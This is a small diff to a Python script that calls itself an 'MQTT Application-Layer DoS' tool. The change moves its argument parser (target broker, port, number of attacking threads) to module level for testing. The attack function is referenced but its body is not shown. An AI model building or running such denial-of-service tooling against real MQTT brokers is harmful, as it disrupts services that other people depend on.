@@ -24,12 +24,13 @@ def attack(broker, port, thread_id):
     except Exception as e:
         print(f"[{thread_id}] Connection failed: {e}")
 
+# Module-level parser for testing
+parser = argparse.ArgumentParser(description="MQTT Application-Layer DoS")
+parser.add_argument("--broker", required=True, help="MQTT Broker IP")
+parser.add_argument("--port", type=int, default=1883, help="MQTT Broker Port")
+parser.add_argument("--threads", type=int, default=50, help="Number of concurrent attacking connections")
+
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="MQTT Application-Layer DoS")
-    parser.add_argument("--broker", required=True, help="MQTT Broker IP")
-    parser.add_argument("--port", type=int, default=1883, help="MQTT Broker Port")
-    parser.add_argument("--threads", type=int, default=50, help="Number of concurrent attacking connections")
-    
     args = parser.parse_args()
     
     print(f"Starting Application-level MQTT attack against {args.broker}:{args.port} with {args.threads} threads...")
